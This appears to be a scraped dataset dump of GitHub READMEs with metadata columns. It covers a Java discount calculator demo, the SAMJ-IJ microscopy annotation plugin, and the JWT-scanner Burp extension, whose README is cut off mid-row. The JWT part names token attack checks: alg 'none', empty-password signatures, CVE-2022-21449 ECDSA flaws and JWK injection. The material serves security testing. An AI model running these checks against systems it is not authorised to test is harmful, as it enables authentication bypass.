public static List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups, Map<String, Map<String,DiscountWrapper>> inMap);
```
为了确保计算性能，我们将用户在当前订单中可享受的优惠分为两个集合。左侧集合的大小限制为`SUPPORTEDSIZE`，即我们重点保障的、在计算能力范围内的优惠。而右侧集合则尽可能地进行叠加。

从稳定性角度考虑，我们需要对计算次数进行统计。在压力测试中，我们通过`LimitingUtil.count`方法来统计进入`calc`方法的次数。显然，在没有开启缓存的情况下，计算次数为 $A_n^n$×n，而当开启缓存时，计算次数为 $A_n^n$×(n−3)+ $A_n^3$。

#### CASE

看了这么多概念，我们可以在`com.gch.discount.demo`包中找到实际调用的具体case：

```Java
@Controller
public class TestController {

    private final CalculatorRouter calculatorRouter;

    public TestController(CalculatorRouter calculatorRouter) {
        this.calculatorRouter = calculatorRouter;
    }

    @RequestMapping(""test"")
    @ResponseBody
    public Object test() {
        //mock商品
        List<GoodsItem> items = mockItems();
        //mock组关系并转化为共享组
        List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> pairs = transform(mockGroups());
        //全局最优计算过程
        List<CalcStage> globalStages=Lists.newArrayList();
        int count = 0;
        //订单总金额
        long totalPrice = items.stream().mapToLong(GoodsInfo::getSalePrice).sum();
        long globalPrice = totalPrice;
        //构建计算流
        Flowable flowable = (Flowable) new Flowable().build(calculatorRouter);
        for(Pair<Set<DiscountWrapper>,Set<DiscountWrapper>> set:pairs) {
            //统计算力
            count += LimitingUtil.count(set.getLeft().size());
            if(count>N){
                break;
            }
            List<DiscountWrapper> wrappers = Lists.newArrayList(set.getLeft());
            DiscountContext<GoodsItem> ctx = DiscountContext.create(totalPrice, Lists.newArrayList(items), wrappers);
            flowable.perm(ctx);
            if(ctx.getCalcResult().getFinalPrice() < globalPrice) {
                globalStages = Arrays.asList(ctx.getCalcResult().getStages());
                globalPrice = ctx.getCalcResult().getFinalPrice();
            }
        }
        return Pair.of(globalPrice,globalStages);
    }

    private List<List<DiscountGroup>> mockGroups(){
        List<List<DiscountGroup>> groups = Lists.newArrayList();
        DiscountGroup group = new DiscountGroup();
        group.setRelation(GroupRelation.SHARE.getType());
        group.setItems(Lists.newArrayList(new Item(""zhekou"",""1""),new Item(""manjian"",""2""),new Item(""manzeng"",""3"")));
        groups.add(Lists.newArrayList(group));
        return groups;
    }

    private List<GoodsItem> mockItems(){
        IdGenerator idGenerator = IdGenerator.getInstance();
        GoodsInfo goodsInfo = GoodsInfo.of(1001L,2001L,null,4,20 * 100,""产品1"",null);
        GoodsInfo goodsInfo2 = GoodsInfo.of(1001L,2002L,null,2,10 * 100,""产品1"",null);
        List<GoodsItem> items = GoodsItem.generateItems(goodsInfo,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice()));
        items.addAll(GoodsItem.generateItems(goodsInfo2,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice())));
        return items;
    }

    private List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups){
        List<DiscountWrapper> wrapperList = Lists.newArrayList(
                DiscountWrapper.of(""zhekou"", ""1"", ""折扣"", false, new DiscountConfig()),
                DiscountWrapper.of(""manjian"", ""2"", ""满减"", false, new DiscountConfig())
        );
        Map<String, Map<String,DiscountWrapper>> inMap = wrapperList.stream().collect(Collectors.toMap(DiscountWrapper::getType, x->ImmutableMap.of(x.getId(),x)));
        return DiscountGroupUtil.transform(groups,inMap);
    }
}

```





",0,0,1,apache-2.0,0.0,"['permutation', 'extends', 'goodsitem', 'n', 'n', 'n', 'discountcontext', 'extends', 'goodsitem', 'precompute', 'extends', 'goodsitem', 'calculator', 'discountgroup', 'case']","['extends', 'goodsitem', 'n', 'permutation', 'discountcontext']",0,0,0,"['permutation', 'lt', 't', 'extend', 'goodsitem', 'gt', 'discountcontext', 'lt', 't', 'extend', 'goodsitem', 'gt', 'precompute', 'lt', 't', 'extend', 'goodsitem', 'gt', 'calculator', 'discountgroup', 'case']",9,"['lt', 't', 'extend', 'goodsitem', 'gt']",15,0.0,1.0,[],0.0,1.0,0.0,12333,300.75,6.872817955112219,['i'],1
segment-anything-models-java/SAMJ-IJ,main,"[![Build Status](https://github.com/segment-anything-models-java/SAMJ-IJ/actions/workflows/build.yml/badge.svg)](https://github.com/segment-anything-models-java/SAMJ-IJ/actions/workflows/build.yml)

# SAMJ-IJ

The SAMJ-IJ is a powerful Fiji plugin for annotating microscopy images using various versions of the [Segment Anything](https://github.com/facebookresearch/segment-anything) Model (SAM). This README provides detailed instructions on how to use the plugin for image annotation. In this first version of the plugin, the SAMJ-IJ Annotator is delivered to annotate images through the usage of prompts. The plugin is designed to be user-friendly and efficient, allowing for easy and accurate image annotation for further analysis.

> [!NOTE]
> This is an **EARLY RELEASE**, many more improvements are coming! Your valuable suggestions for enhancements are encouraged in the [Issues section](https://github.com/segment-anything-models-java/SAMJ-IJ/issues) or on the [image.sc forum](https://forum.image.sc/).

## Contents
- [Installation](#installation)
- [Model Installation](#model-installation)
- [Annotating Images](#annotating-images)
- [Saving Annotations](#saving-annotations)
- [Usage Example](#usage-example)
- [Use Cases](#use-cases)
- [Contributors](#contributors)
- [Notes](#notes)

## Fiji and Plugin Installation

Before you can annotate images using SAMJ-IJ, you need to install the plugin in Fiji:

1. **Install Fiji**: If you haven't already, download and install [Fiji](https://fiji.sc/).

> [!IMPORTANT]
> For MacOS users, if your Fiji instance is launched from the Downloads folder, SAMJ will not work! Move Fiji to another folder, Documents or Desktop, for example.

2. **Install SAMJ Plugin**: Open Fiji and navigate to `Help > Update...`. In the `Manage update sites` window, and look for an update site named `SAMJ`, select it, click on `Apply and close` and then `Apply changes`. Finally restart Fiji.

   If you cannot find `SAMJ` among the update sites list, click on `Add update site`/`Add unlisted site`, write `SAMJ` in the `Name` field and `https://sites.imagej.net/SAMJ/` in the `URL` field. Click on `Apply and close`, click on `Apply changes` and restart Fiji. 
![SAMJ Update site](./images/update-site-example.png)
5. **Open SAMJ-IJ Annotator**: Start Fiji and navigate to `Plugins > SAMJ > SAMJ Annotator` to open the plugin.

## Model Installation

To use the SAMJ-IJ plugin, you must install a SAM model. These are the models available for installation:
* **EfficientSAM:** A [base model](https://github.com/yformer/EfficientSAM/tree/main) designed for segmentation tasks, optimized for performance on standard computational resources. Ideal for accurate annotations and segmentations Computationally heavy. Do not use it on low-end computers.
* **EfficientViTSAM-l0:** A lightweight variant of the [EfficientViTSAM](https://arxiv.org/abs/2402.05008) model, offering a balance between segmentation accuracy and computational demand, suitable for use on regular computers.
* **EfficientViTSAM-l1:** An intermediate version, providing enhanced accuracy for complex segmentation tasks with manageable resource requirements.
* **EfficientViTSAM-l2:** A more advanced version designed for high-accuracy segmentation in demanding scenarios requiring higher computational resources.
* **EfficientViTSAM-xl0:** An extra-large model variant, pushing the boundaries of segmentation accuracy at the expense of increased computational demand.
* **EfficientViTSAM-xl1:** The most advanced and resource-intensive version, offering state-of-the-art segmentation performance for the most challenging tasks.

> [!WARNING]
> Users with a low-end computer are advised not to use the **EfficientSAM** model as it might take up to 10 minutes to load the first time, or the computer can even be frozen. The fastest and lightest model is **EfficientViTSAM-l0**, but low-resource machines might take up to 2-3 minutes to load the first time. Subsequent loading times will be much faster (~10s).

These are the steps to install a model:
1. Open the SAMJ Annotator plugin as described above.
2. Choose a SAM model from the list provided within the plugin.
3. Click on the `Install` button next to the selected model.
4. Wait for the installation process to complete. This may take some time, depending on the model size, your computer, and your internet connection.

> [!CAUTION]
> Model installation times vary based on your machine's specifications, ranging from seconds to up to 20 minutes. Please be patient.



This video demonstrates the live installation of EfficientViTSAM-l1 on a Mac M1.
![Installing EfficientViTSAM-l1](./images/installing-gif.gif)



## Annotating Images

Once you have installed a model, follow these steps to annotate your image:

1. **Open Image**: Open the microscopy image you want to annotate in Fiji.
2. **Select the Image**: In the SAMJ Annotator plugin, ensure your image is selected in the dropdown bar.
3. **Start Annotation**: Click on `Go!` to begin the annotation process. This button will encode your image so you can start annotating. It can take a while.
4. **Choose Annotation Method**: Use one of the following tools to annotate your image:
   - `Rectangle (Rect)`: Draw rectangular Regions Of Interest (ROIs).
   - `Points`: Click to mark points on the image. Hold `Ctrl` to select multiple points for a single object.
   - `Brush`: Paint freeform ROIs.

   Optionally, untick the `Add to ROI Manager` checkbox if you don't want your annotations to be added to the Fiji ROI Manager automatically.
   *Note: the first annotation can take several seconds.*
5. **Annotate**: Annotate as many objects as needed. With each ROI drawn using one of the three tools, the installed SAM version will run, and the object will be annotated.
6. **Manage Annotations**: All annotations will be sent to the ROI Manager (if the checkbox is ticked), where you can perform various operations as allowed by Fiji's ROI Manager functionality.

## Saving Annotations

### All ROIs or the largest one
To save your annotations, you can opt for either exporting every ROI using the ""Return all ROIs"" feature or selecting ""Only return the largest ROI"" to export solely the largest one. In the context of annotating heterogeneous images with various ROIs, as displayed below, you have the choice to either preserve the entirety of the ROIs, which would include every annotated object, such as the nuclei and the entire embryo or to conserve exclusively the predominant ROI, which, in this example, would be the complete embryo.

![Embryo Annotation](./images/allROI-largestROI.png)

### Export to Labelling

This button simplifies the process of exporting your annotations, which are saved as semantic annotations where each marked region is assigned a distinct value. For enhanced visual clarity, we suggest altering the Look-Up Table (LUT) in Fiji (Image > Lookup Tables > Glasbey or choose another option).


<p float=""center"">
  <img src=""/images/embryo.png"" width=""25%"" />
  <img src=""/images/embryo-nuclei-labeling.png"" width=""25%"" /> 
</p>


## Usage Example

Below is an illustration of object annotation using the SAMJ-IJ plugin. Each object is delineated and labelled to showcase the plugin's straightforward and efficient capabilities in image analysis.

![Usage Example](/images/usage-example.png)

Follow this comprehensive workflow to annotate your image with SAMJ-IJ:

1. **Model Installation**: Choose and install your preferred model for image annotation. Refer to [Model Installation](#model-installation) for detailed information on each model.
2. **Open Image in Fiji**: Navigate to `File > Open` in Fiji or drag and drop your image directly into the interface.
3. **Encode Image**: With the model installed and the image open, select your image from the dropdown menu and click `Go!` to encode it. This may take some time depending on your system's capabilities.
4. **Annotation**: Annotate your image freely. All annotations will appear in the ROI manager. For clarity, when dealing with numerous closely spaced ROIs, uncheck the `Labels` option in the ROI manager. See [Annotating Images](#annotating-images) for more details.
5. **Export Annotations**: Once finished with the annotations, click `Export to Labelling...` to save your semantic annotations.
6. **Enhance Visualization**: Improve the visibility of your mask by altering the LUT. For example, you can apply the Glasbey LUT via `Image > Lookup Tables > Glasbey`.

![Complete workflow](/images/complete-workflow-gif.gif)

## Use Cases
This Fiji plugin is intended to work with microscopy images. To show its versatility among different images, here are some use cases. 

![Use Cases of different annotations in microscpy images](images/annotation-examples.png)

#### a) Astrocytes stained for actin
The original image (top left in the figure) displays astrocytes stained for actin following mechanical deformation as part of a study exploring the mechanical and functional responses of astrocytes using magneto-active substrates [1]. The annotated image (bottom left in the figure) highlights individual astrocytes for detailed analysis. 
This annotation was accomplished using the ""Points Prompt"" feature coupled with the ""Return Only Largest ROI"" option to annotate each astrocyte visible in the image selectively. The primary goal of this annotation is to facilitate a comparative study of astrocyte morphology pre- and post-deformation, thus contributing valuable insights into the biomechanical properties and adaptive responses of astrocytes under stress.

#### b) Bacterial mobility on agar plates
The images (top center and bottom center in the figure) showcase the results of mobility assays for *Pseudomonas aeruginosa* strains on agar plates [2]. These assays are crucial for studying the surface motility of bacteria, which is considered a key factor in pathogenicity due to its role in chemotaxis, biofilm formation, and overall virulence. The original images depict the spread of bacteria on agar plates following incubation, captured using the Chemi DOC™ image system. The annotations made using the SAMJ plugin allow for precise measurement and analysis of the spread area, significantly automating a task that was previously manual, tedious, and time-consuming. By leveraging SAMJ for these annotations, researchers can efficiently quantify bacterial motility, facilitating deeper insights into bacterial behavior and its implications on disease spreading and antimicrobial resistance. This enhances the plugin's value in microbial research, providing a robust tool for assessing bacterial dynamics in a consistent and reproducible manner.

#### c) Organoids
The images (top right and bottom right in the figure) illustrate organoids captured for the purpose of segmentation, counting, and analysis of morphological features such as area and eccentricity [3]. These organoids are typically used to model biological processes in vitro, providing a robust platform for studies in developmental biology, disease pathology, and drug screening. The original images capture the diverse shapes and sizes of organoids, which can be challenging to quantify manually. Using the SAMJ plugin, researchers can automate the segmentation and counting of organoids, and accurately measure their area and eccentricity. This annotation capability not only enhances the precision and efficiency of the analysis but also supports high-throughput screening and detailed morphometric assessments. The ability of SAMJ to handle such complex image data demonstrates its utility in advanced biological research and experimental reproducibility.



#### References
[1] Gomez‐Cruz, C., Fernandez‐de la Torre, M., Lachowski, D., Prados‐de‐Haro, M., del Río Hernández, A. E., Perea, G., ... & Garcia‐Gonzalez, D. (2024). Mechanical and Functional Responses in Astrocytes under Alternating Deformation Modes Using Magneto‐Active Substrates. Advanced Materials, 2312497.

[2] Casado-Garcia, A., Chichón, G., Dominguez, C., Garcia-Dominguez, M., Heras, J., Ines, A., ... & Saenz, Y. (2021). MotilityJ: An open-source tool for the classification and segmentation of bacteria on motility images. Computers in biology and medicine, 136, 104673.

[3] Segmentation, counting, and measurement of area and eccentricity (circularity) of organoids in [image.sc forum](https://forum.image.sc/t/segmentation-counting-measurement-of-area-and-eccentricity-circularity-of-organoids/90751)

## Contributors

**Carlos García-López-de-Haro**, *Bioimage Analysis Unit, Institut Pasteur, Université Paris Cité, Paris, France* - [@carlosuc3m](https://github.com/carlosuc3m)  
**Caterina Fuster-Barceló**, *Bioengineering Department, Universidad Carlos III de Madrid, Leganés, Spain* - [@cfusterbarcelo](https://github.com/cfusterbarcelo)  
**Curtis T. Rueden**, *Center for Quantitative Cell Imaging, University of Wisconsin, Madison, USA* - [@ctrueden](https://github.com/ctrueden)  
**Jónathan Heras**, *Department of Mathematics and Computer Science, University of La Rioja, Logroño, Spain* - [@joheras](https://github.com/joheras)  
**Vladimir Ulman**, *IT4Innovations, VSB - Technical University of Ostrava, Ostrava, Czech Republic* - [@xulman](https://github.com/xulman)  
**Adrián Inés**, *Department of Mathematics and Computer Science, University of La Rioja, Logroño, Spain* - [@adines](https://github.com/adines)  
**Kevin Eliceri**, *Center for Quantitative Cell Imaging, University of Wisconsin, Madison, USA*  - [@eliceiri](https://github.com/eliceiri)  
**J.C. Olivo-Marin**, *CNRS UMR 3691, Institut Pasteur, Paris, France*  
**Daniel Sage**, *Biomedical Imaging Group and Center for Imaging, École Polytechnique Fédérale de Lausanne (EPFL), Lausanne, Switzerland* - [@dasv74](https://github.com/dasv74)  
**Arrate Muñoz-Barrutia**, *Bioengineering Department, Universidad Carlos III de Madrid, Leganés, Spain* - [@arratemunoz](https://github.com/arratemunoz)


## Notes

- This plugin is intended to use with microscopy images.
- The documentation here is for users only. Developer documentation, including contribution guidelines, will be available in a separate repository.
- For further assistance or to report issues, please visit the [plugin's repository](https://github.com/segment-anything-models-java/SAMJ-IJ).

Thank you for using the SAMJ-IJ Fiji plugin!
",0,8,2,apache-2.0,9.0,"['powerful', 'fiji', 'plugin', 'annotating', 'microscopy', 'image', 'using', 'various', 'version', 'segment', 'anything', 'model', 'sam', 'readme', 'provides', 'detailed', 'instruction', 'use', 'plugin', 'image', 'annotation', 'first', 'version', 'plugin', 'annotator', 'delivered', 'annotate', 'image', 'usage', 'prompt', 'plugin', 'designed', 'efficient', 'allowing', 'easy', 'accurate', 'image', 'annotation', 'analysis', 'note', 'early', 'release', 'many', 'improvement', 'coming', 'valuable', 'suggestion', 'enhancement', 'encouraged', 'issue', 'section', 'forum', 'content', 'installation', 'model', 'installation', 'annotating', 'image', 'saving', 'annotation', 'usage', 'example', 'use', 'case', 'contributor', 'note', 'fiji', 'plugin', 'installation', 'annotate', 'image', 'using', 'need', 'install', 'plugin', 'fiji', 'install', 'fiji', 'already', 'download', 'install', 'fiji', 'important', 'macos', 'user', 'fiji', 'instance', 'launched', 'downloads', 'folder', 'samj', 'work', 'move', 'fiji', 'another', 'folder', 'document', 'desktop', 'example', 'install', 'samj', 'plugin', 'open', 'fiji', 'navigate', 'window', 'look', 'update', 'site', 'named', 'select', 'click', 'finally', 'restart', 'fiji', 'find', 'among', 'update', 'site', 'list', 'click', 'write', 'field', 'field', 'click', 'click', 'restart', 'fiji', 'open', 'annotator', 'start', 'fiji', 'navigate', 'open', 'plugin', 'model', 'installation', 'use', 'plugin', 'must', 'install', 'sam', 'model', 'model', 'available', 'installation', 'efficientsam', 'base', 'model', 'designed', 'segmentation', 'task', 'optimized', 'performance', 'standard', 'computational', 'resource', 'ideal', 'accurate', 'annotation', 'segmentation', 'computationally', 'heavy', 'use', 'computer', 'lightweight', 'variant', 'efficientvitsam', 'model', 'offering', 'balance', 'segmentation', 'accuracy', 'computational', 'demand', 'suitable', 'use', 'regular', 'computer', 'intermediate', 'version', 'providing', 'enhanced', 'accuracy', 'complex', 'segmentation', 'task', 'manageable', 'resource', 'requirement', 'advanced', 'version', 'designed', 'segmentation', 'demanding', 'scenario', 'requiring', 'higher', 'computational', 'resource', 'model', 'variant', 'pushing', 'boundary', 'segmentation', 'accuracy', 'expense', 'increased', 'computational', 'demand', 'advanced', 'version', 'offering', 'segmentation', 'performance', 'challenging', 'task', 'warning', 'user', 'computer', 'advised', 'use', 'efficientsam', 'model', 'might', 'take', 'minute', 'load', 'first', 'time', 'computer', 'even', 'frozen', 'fastest', 'lightest', 'model', 'machine', 'might', 'take', 'minute', 'load', 'first', 'time', 'subsequent', 'loading', 'time', 'much', 'faster', 'step', 'install', 'model', 'open', 'samj', 'annotator', 'plugin', 'described', 'choose', 'sam', 'model', 'list', 'provided', 'within', 'plugin', 'click', 'button', 'next', 'selected', 'model', 'wait', 'installation', 'process', 'complete', 'may', 'take', 'time', 'depending', 'model', 'size', 'computer', 'internet', 'connection', 'caution', 'model', 'installation', 'time', 'vary', 'based', 'machine', 'specification', 'ranging', 'second', 'minute', 'please', 'patient', 'video', 'demonstrates', 'live', 'installation', 'mac', 'annotating', 'image', 'installed', 'model', 'follow', 'step', 'annotate', 'image', 'open', 'image', 'open', 'microscopy', 'image', 'want', 'annotate', 'fiji', 'select', 'image', 'samj', 'annotator', 'plugin', 'ensure', 'image', 'selected', 'dropdown', 'bar', 'start', 'annotation', 'click', 'begin', 'annotation', 'process', 'button', 'encode', 'image', 'start', 'annotating', 'take', 'choose', 'annotation', 'method', 'use', 'one', 'following', 'tool', 'annotate', 'image', 'draw', 'rectangular', 'regions', 'interest', 'rois', 'click', 'mark', 'point', 'image', 'hold', 'select', 'multiple', 'point', 'single', 'object', 'paint', 'freeform', 'rois', 'optionally', 'untick', 'checkbox', 'want', 'annotation', 'added', 'fiji', 'roi', 'manager', 'automatically', 'note', 'first', 'annotation', 'take', 'several', 'second', 'annotate', 'annotate', 'many', 'object', 'needed', 'roi', 'drawn', 'using', 'one', 'three', 'tool', 'installed', 'sam', 'version', 'run', 'object', 'annotated', 'manage', 'annotation', 'annotation', 'sent', 'roi', 'manager', 'checkbox', 'ticked', 'perform', 'various', 'operation', 'allowed', 'fiji', 'roi', 'manager', 'functionality', 'saving', 'annotation', 'rois', 'largest', 'one', 'save', 'annotation', 'opt', 'either', 'exporting', 'every', 'roi', 'using', 'return', 'rois', 'feature', 'selecting', 'return', 'largest', 'roi', 'export', 'solely', 'largest', 'one', 'context', 'annotating', 'heterogeneous', 'image', 'various', 'rois', 'displayed', 'choice', 'either', 'preserve', 'entirety', 'rois', 'would', 'include', 'every', 'annotated', 'object', 'nucleus', 'entire', 'embryo', 'conserve', 'exclusively', 'predominant', 'roi', 'example', 'would', 'complete', 'embryo', 'export', 'labelling', 'button', 'simplifies', 'process', 'exporting', 'annotation', 'saved', 'semantic', 'annotation', 'marked', 'region', 'assigned', 'distinct', 'value', 'enhanced', 'visual', 'clarity', 'suggest', 'altering', 'table', 'lut', 'fiji', 'image', 'lookup', 'table', 'glasbey', 'choose', 'another', 'option', 'usage', 'example', 'illustration', 'object', 'annotation', 'using', 'plugin', 'object', 'delineated', 'labelled', 'showcase', 'plugin', 'straightforward', 'efficient', 'capability', 'image', 'analysis', 'follow', 'comprehensive', 'workflow', 'annotate', 'image', 'model', 'installation', 'choose', 'install', 'preferred', 'model', 'image', 'annotation', 'refer', 'model', 'installation', 'detailed', 'information', 'model', 'open', 'image', 'fiji', 'navigate', 'fiji', 'drag', 'drop', 'image', 'directly', 'interface', 'encode', 'image', 'model', 'installed', 'image', 'open', 'select', 'image', 'dropdown', 'menu', 'click', 'encode', 'may', 'take', 'time', 'depending', 'system', 'capability', 'annotation', 'annotate', 'image', 'freely', 'annotation', 'appear', 'roi', 'manager', 'clarity', 'dealing', 'numerous', 'closely', 'spaced', 'rois', 'uncheck', 'option', 'roi', 'manager', 'see', 'annotating', 'image', 'detail', 'export', 'annotation', 'finished', 'annotation', 'click', 'save', 'semantic', 'annotation', 'enhance', 'visualization', 'improve', 'visibility', 'mask', 'altering', 'lut', 'example', 'apply', 'glasbey', 'lut', 'via', 'use', 'case', 'fiji', 'plugin', 'intended', 'work', 'microscopy', 'image', 'show', 'versatility', 'among', 'different', 'image', 'use', 'case', 'astrocyte', 'stained', 'actin', 'original', 'image', 'top', 'left', 'figure', 'display', 'astrocyte', 'stained', 'actin', 'following', 'mechanical', 'deformation', 'part', 'study', 'exploring', 'mechanical', 'functional', 'response', 'astrocyte', 'using', 'substrate', 'annotated', 'image', 'bottom', 'left', 'figure', 'highlight', 'individual', 'astrocyte', 'detailed', 'analysis', 'annotation', 'accomplished', 'using', 'point', 'prompt', 'feature', 'coupled', 'return', 'largest', 'roi', 'option', 'annotate', 'astrocyte', 'visible', 'image', 'selectively', 'primary', 'goal', 'annotation', 'facilitate', 'comparative', 'study', 'astrocyte', 'morphology', 'thus', 'contributing', 'valuable', 'insight', 'biomechanical', 'property', 'adaptive', 'response', 'astrocyte', 'stress', 'b', 'bacterial', 'mobility', 'agar', 'plate', 'image', 'top', 'center', 'bottom', 'center', 'figure', 'showcase', 'result', 'mobility', 'assay', 'pseudomonas', 'aeruginosa', 'strain', 'agar', 'plate', 'assay', 'crucial', 'studying', 'surface', 'motility', 'bacteria', 'considered', 'key', 'factor', 'pathogenicity', 'due', 'role', 'chemotaxis', 'biofilm', 'formation', 'overall', 'virulence', 'original', 'image', 'depict', 'spread', 'bacteria', 'agar', 'plate', 'following', 'incubation', 'captured', 'using', 'chemi', 'image', 'system', 'annotation', 'made', 'using', 'samj', 'plugin', 'allow', 'precise', 'measurement', 'analysis', 'spread', 'area', 'significantly', 'automating', 'task', 'previously', 'manual', 'tedious', 'leveraging', 'samj', 'annotation', 'researcher', 'efficiently', 'quantify', 'bacterial', 'motility', 'facilitating', 'deeper', 'insight', 'bacterial', 'behavior', 'implication', 'disease', 'spreading', 'antimicrobial', 'resistance', 'enhances', 'plugin', 'value', 'microbial', 'research', 'providing', 'robust', 'tool', 'assessing', 'bacterial', 'dynamic', 'consistent', 'reproducible', 'manner', 'c', 'organoids', 'image', 'top', 'right', 'bottom', 'right', 'figure', 'illustrate', 'organoids', 'captured', 'purpose', 'segmentation', 'counting', 'analysis', 'morphological', 'feature', 'area', 'eccentricity', 'organoids', 'typically', 'used', 'model', 'biological', 'process', 'vitro', 'providing', 'robust', 'platform', 'study', 'developmental', 'biology', 'disease', 'pathology', 'drug', 'screening', 'original', 'image', 'capture', 'diverse', 'shape', 'size', 'organoids', 'challenging', 'quantify', 'manually', 'using', 'samj', 'plugin', 'researcher', 'automate', 'segmentation', 'counting', 'organoids', 'accurately', 'measure', 'area', 'eccentricity', 'annotation', 'capability', 'enhances', 'precision', 'efficiency', 'analysis', 'also', 'support', 'screening', 'detailed', 'morphometric', 'assessment', 'ability', 'samj', 'handle', 'complex', 'image', 'data', 'demonstrates', 'utility', 'advanced', 'biological', 'research', 'experimental', 'reproducibility', 'references', 'c', 'la', 'torre', 'm', 'lachowski', 'd', 'm', 'del', 'a', 'e', 'perea', 'g', 'd', 'mechanical', 'functional', 'responses', 'astrocyte', 'alternating', 'deformation', 'mode', 'using', 'substrate', 'advanced', 'material', 'a', 'g', 'dominguez', 'c', 'm', 'hera', 'j', 'ines', 'a', 'saenz', 'motilityj', 'tool', 'classification', 'segmentation', 'bacteria', 'motility', 'image', 'computer', 'biology', 'medicine', 'segmentation', 'counting', 'measurement', 'area', 'eccentricity', 'circularity', 'organoids', 'forum', 'contributor', 'carlos', 'bioimage', 'analysis', 'unit', 'institut', 'pasteur', 'paris', 'paris', 'france', 'caterina', 'bioengineering', 'department', 'universidad', 'carlos', 'iii', 'de', 'madrid', 'spain', 'cfusterbarcelo', 'curtis', 't', 'rueden', 'center', 'quantitative', 'cell', 'imaging', 'university', 'wisconsin', 'madison', 'usa', 'ctrueden', 'hera', 'department', 'mathematics', 'computer', 'science', 'university', 'la', 'rioja', 'spain', 'joheras', 'vladimir', 'ulman', 'vsb', 'technical', 'university', 'ostrava', 'ostrava', 'czech', 'republic', 'xulman', 'department', 'mathematics', 'computer', 'science', 'university', 'la', 'rioja', 'spain', 'adines', 'kevin', 'eliceri', 'center', 'quantitative', 'cell', 'imaging', 'university', 'wisconsin', 'madison', 'usa', 'eliceiri', 'cnrs', 'umr', 'institut', 'pasteur', 'paris', 'france', 'daniel', 'sage', 'biomedical', 'imaging', 'group', 'center', 'imaging', 'polytechnique', 'de', 'lausanne', 'epfl', 'lausanne', 'switzerland', 'arrate', 'bioengineering', 'department', 'universidad', 'carlos', 'iii', 'de', 'madrid', 'spain', 'arratemunoz', 'note', 'plugin', 'intended', 'use', 'microscopy', 'image', 'documentation', 'user', 'developer', 'documentation', 'including', 'contribution', 'guideline', 'available', 'separate', 'repository', 'assistance', 'report', 'issue', 'please', 'visit', 'plugin', 'repository', 'thank', 'using', 'fiji', 'plugin']","['image', 'annotation', 'model', 'plugin', 'fiji']",10,0,0,"['content', 'fiji', 'plugin', 'installation', 'model', 'installation', 'annotate', 'image', 'save', 'annotation', 'all', 'roi', 'large', 'one', 'export', 'label', 'usage', 'example', 'use', 'case', 'a', 'astrocytes', 'stained', 'actin', 'b', 'bacterial', 'mobility', 'agar', 'plate', 'c', 'organoids', 'reference', 'contributor', 'note']",16,"['installation', 'content', 'fiji', 'plugin', 'model']",0,0.0,1.0,[],0.0,1.0,0.0,14367,16.991869918699187,5.363636363636363,"['![Build Status -> https://github.com/segment-anything-models-java/SAMJ-IJ/actions/workflows/build.yml/badge.svg', 'Segment Anything -> https://github.com/facebookresearch/segment-anything', 'Issues section -> https://github.com/segment-anything-models-java/SAMJ-IJ/issues', 'image.sc forum -> https://forum.image.sc/', 'Fiji -> https://fiji.sc/', 'base model -> https://github.com/yformer/EfficientSAM/tree/main', 'EfficientViTSAM -> https://arxiv.org/abs/2402.05008', '3] Segmentation, counting, and measurement of area and eccentricity (circularity) of organoids in [image.sc forum -> https://forum.image.sc/t/segmentation-counting-measurement-of-area-and-eccentricity-circularity-of-organoids/90751', '@carlosuc3m -> https://github.com/carlosuc3m', '@cfusterbarcelo -> https://github.com/cfusterbarcelo', '@ctrueden -> https://github.com/ctrueden', '@joheras -> https://github.com/joheras', '@xulman -> https://github.com/xulman', '@adines -> https://github.com/adines', '@eliceiri -> https://github.com/eliceiri', '@dasv74 -> https://github.com/dasv74', '@arratemunoz -> https://github.com/arratemunoz', ""plugin's repository -> https://github.com/segment-anything-models-java/SAMJ-IJ""]",18
CompassSecurity/jwt-scanner,master,"# JWT-scanner - Burp Extension
## Description
JWT Scanner is a Burp Suite extension for automated testing of Jason Web Token (JWT) implementations of web applications. 


### Checks
- Signature presence
- Invalid signatures
- Signatures with empty passwords
- Usage of algorithm none variations
- Invalid ECDSA parameters (CVE-2022-21449)
- JWT JWK injection

## Features
- Select base request and autodetection of JWT
- Manually select target JWT in source request

## Usage
Run an active scan or manually select a request from to check:

1. Go to  Proxy / Repeater / Target / Logger / Intruder
2. Select request that requires a authentication with a valid JWT and returns a HTTP 200 response
> **_NOTE:_** First the extension will resend the selected request without modification and check if the JWT is still valid. If not a Error will be displayed in the Event Log

### Automatically detect JWT
3. Right-click on the request you want to check.
4. Extension -> JWT-scanner -> Autodetect JWT
5. In case of a identified vulnerability a issue is generated

Autodetect JWT from valid request:
![img.png](Doc/autoselect.png)
### Manually select JWT
3. Highlight the target JWT in request
4. Right-click highlighted JWT request
5. Extension -> JWT-scanner -> Selected JWT
6. In case of a identified vulnerability a issue is generated

## Installation
1. Download the latest pre-built jar file from [releases](https://github.com/CompassSecurity/jwt-scanner/releases).
2. Extender -> Tab Installed -> Add -> Extension Details -> Extension Type: *Java* -> Select file ...
3. Select the downloaded jar

Manually select JWT from valid request:
![img_1.png](Doc/manualselect.png)
## Build
Using maven to build jar file with dependencies:
```shell
mvn package -f pom.xml
```
",5,1,4,mit,2.0,"['burp', 'extension', 'description', 'jwt', 'scanner', 'burp', 'suite', 'extension', 'automated', 'testing', 'jason', 'web', 'token', 'jwt', 'implementation', 'web', 'application', 'check', 'signature', 'presence', 'invalid', 'signature', 'signature', 'empty', 'password', 'usage', 'algorithm', 'none', 'variation', 'invalid', 'ecdsa', 'parameter', 'jwt', 'jwk', 'injection', 'feature', 'select', 'base', 'request', 'autodetection', 'jwt', 'manually', 'select', 'target', 'jwt', 'source', 'request', 'usage', 'run', 'active', 'scan', 'manually', 'select', 'request', 'check', 'go', 'proxy', 'repeater', 'target', 'logger', 'intruder', 'select', 'request', 'requires', 'authentication', 'valid', 'jwt', 'return', 'http', 'response', 'note', 'first', 'extension', 'resend', 'selected', 'request', 'without', 'modification', 'check', 'jwt', 'still', 'valid', 'error', 'displayed', 'event', 'log', 'automatically', 'detect', 'jwt', 'request', 'want', 'check', 'extension', 'autodetect', 'jwt', 'case', 'identified', 'vulnerability', 'issue', 'generated', 'autodetect', 'jwt', 'valid', 'request', 'manually', 'select', 'jwt', 'highlight', 'target', 'jwt', 